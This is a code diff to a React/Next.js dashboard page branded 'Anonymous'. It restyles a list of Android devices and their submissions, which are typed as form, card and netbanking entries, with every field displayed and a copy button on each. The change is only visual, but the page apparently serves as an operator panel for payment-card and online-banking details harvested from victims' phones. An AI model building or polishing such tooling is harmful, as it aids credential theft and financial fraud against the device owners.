@@ -318,10 +318,9 @@ export default function FormPage() {
     <div className="min-h-screen bg-white">
       <header className="w-full bg-black">
         <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4 gap-4">
-          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d] shrink-0">
+          <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#8B0000] shrink-0">
             Anonymous
           </Link>
-          {/* Nav: horizontal scroll on small screens, no wrapping */}
           <nav className="flex items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base overflow-x-auto whitespace-nowrap scrollbar-hide">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Home
@@ -397,7 +396,7 @@ export default function FormPage() {
                 </p>
               </div>
             ) : (
-              <div className="space-y-6">
+              <div className="space-y-4">
                 {filteredDevices.map((device) => {
                   const allSubmissions = getAllSubmissions(device);
                   
@@ -407,92 +406,100 @@ export default function FormPage() {
                     <div
                       key={device.id}
                       onClick={() => handleCardClick(device.id)}
-                      style={{ cursor: 'pointer' }}
-                      className="block"
+                      className="cursor-pointer"
                     >
-                      <div className="p-5 border border-gray-300 bg-white rounded-lg">
-                        <div className="mb-4 pb-3 border-b border-gray-200">
-                          <div className="flex items-center mb-2">
-                            <div className="flex items-center gap-2">
-                              <span className="text-xs font-bold text-gray-500">DEVICE ID:</span>
-                              <span className="text-sm font-mono font-bold text-blue-700 bg-blue-50 px-2 py-1 rounded">
+                      <Card className="w-full bg-white shadow-sm hover:shadow-md transition-shadow">
+                        <div className="p-5">
+                          {/* Device Info */}
+                          <div className="mb-4 pb-3 border-b border-gray-200">
+                            <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
+                              <span className="text-xs font-mono text-gray-600 bg-gray-100 px-2 py-1 rounded">
                                 {device.id}
                               </span>
+                              <div className="flex items-center gap-2 text-xs text-gray-500">
+                                <span>{device.brand} {device.model}</span>
+                                {device.androidVersion !== "Unknown" && (
+                                  <span>• Android {device.androidVersion}</span>
+                                )}
+                                <span>• {device.joinedAt}</span>
+                              </div>
                             </div>
                           </div>
-                          <div className="flex flex-wrap gap-3 text-xs text-gray-500">
-                            <span>{device.brand} {device.model}</span>
-                            {device.androidVersion !== "Unknown" && (
-                              <span>Android {device.androidVersion}</span>
-                            )}
-                            <span>Joined: {device.joinedAt}</span>
+
+                          {/* Submissions */}
+                          <div className="space-y-4">
+                            {allSubmissions.map((submission) => {
+                              const timestampValue = submission.timestamp || submission.createdAt || submission.updatedAt;
+                              const timestamp = timestampValue ? parseTimestamp(timestampValue) : 0;
+                              
+                              const submissionType = submission.type;
+                              let typeLabel = '';
+                              let typeColor = '';
+                              if (submissionType === 'form') {
+                                typeLabel = 'FORM';
+                                typeColor = 'text-blue-600 bg-blue-50';
+                              } else if (submissionType === 'card') {
+                                typeLabel = 'CARD';
+                                typeColor = 'text-purple-600 bg-purple-50';
+                              } else if (submissionType === 'netbanking') {
+                                typeLabel = 'NETBANKING';
+                                typeColor = 'text-green-600 bg-green-50';
+                              }
+
+                              return (
+                                <div key={submission.id} className="border-l-2 border-gray-200 pl-3">
+                                  <div className="flex items-center gap-2 mb-2">
+                                    <span className={`text-xs font-semibold px-2 py-0.5 rounded ${typeColor}`}>
+                                      {typeLabel}
+                                    </span>
+                                    {timestamp > 0 && (
+                                      <span className="text-xs text-gray-400">
+                                        {formatSmartTime(timestamp)}
+                                      </span>
+                                    )}
+                                  </div>
+                                  
+                                  <div className="space-y-2">
+                                    {Object.entries(submission).map(([key, value]) => {
+                                      const keyLower = key.toLowerCase();
+                                      if (
+                                        key === "id" ||
+                                        key === "type" ||
+                                        keyLower.includes("timestamp") ||
+                                        keyLower.includes("createdat") ||
+                                        keyLower.includes("updatedat")
+                                      ) {
+                                        return null;
+                                      }
+                                      
+                                      const displayValue = formatDisplayValue(key, value);
+                                      if (!displayValue || displayValue === "") return null;
+                                      
+                                      return (
+                                        <div key={key} className="group">
+                                          <div className="flex items-center gap-1 mb-1">
+                                            <span className="font-semibold text-gray-700 text-xs uppercase tracking-wide">
+                                              {key}:
+                                            </span>
+                                            <FaCopy
+                                              size={11}
+                                              onClick={(e) => copyToClipboard(String(value), e)}
+                                              className="cursor-pointer text-gray-400 hover:text-gray-600 transition-colors"
+                                            />
+                                          </div>
+                                          <div className="text-sm text-gray-700 break-all leading-relaxed">
+                                            {displayValue}
+                                          </div>
+                                        </div>
+                                      );
+                                    })}
+                                  </div>
+                                </div>
+                              );
+                            })}
                           </div>
                         </div>
-
-                        <div className="space-y-4">
-                          {allSubmissions.map((submission) => {
-                            const timestampValue = submission.timestamp || submission.createdAt || submission.updatedAt;
-                            const timestamp = timestampValue ? parseTimestamp(timestampValue) : 0;
-                            
-                            const submissionType = submission.type;
-                            let typeLabel = '';
-                            if (submissionType === 'form') {
-                              typeLabel = 'FORM';
-                            } else if (submissionType === 'card') {
-                              typeLabel = 'CARD';
-                            } else if (submissionType === 'netbanking') {
-                              typeLabel = 'NETBANKING';
-                            }
-
-                            return (
-                              <div key={submission.id} className="border-l-2 border-blue-200 pl-3">
-                                <div className="flex items-center gap-2 mb-2">
-                                  <span className="text-xs font-bold text-blue-600">{typeLabel}</span>
-                                  {timestamp > 0 && (
-                                    <span className="text-[10px] text-gray-400">
-                                      {formatSmartTime(timestamp)}
-                                    </span>
-                                  )}
-                                </div>
-                                
-                                {Object.entries(submission).map(([key, value]) => {
-                                  const keyLower = key.toLowerCase();
-                                  if (
-                                    key === "id" ||
-                                    key === "type" ||
-                                    keyLower.includes("timestamp") ||
-                                    keyLower.includes("createdat") ||
-                                    keyLower.includes("updatedat")
-                                  ) {
-                                    return null;
-                                  }
-                                  
-                                  const displayValue = formatDisplayValue(key, value);
-                                  if (!displayValue || displayValue === "") return null;
-                                  
-                                  return (
-                                    <div key={key} className="mb-2">
-                                      <div className="flex flex-row items-center gap-1 mb-1">
-                                        <span className="font-semibold text-blue-800 text-xs uppercase">
-                                          {key}:
-                                        </span>
-                                        <FaCopy
-                                          size={12}
-                                          onClick={(e) => copyToClipboard(String(value), e)}
-                                          className="cursor-pointer hover:text-gray-600"
-                                        />
-                                      </div>
-                                      <span className="text-sm text-gray-700 break-all">
-                                        {displayValue}
-                                      </span>
-                                    </div>
-                                  );
-                                })}
-                              </div>
-                            );
-                          })}
-                        </div>
-                      </div>
+                      </Card>
                     </div>
                   );
                 })}
@@ -504,5 +511,3 @@ export default function FormPage() {
     </div>
   );
 }
-
-// kkkkk
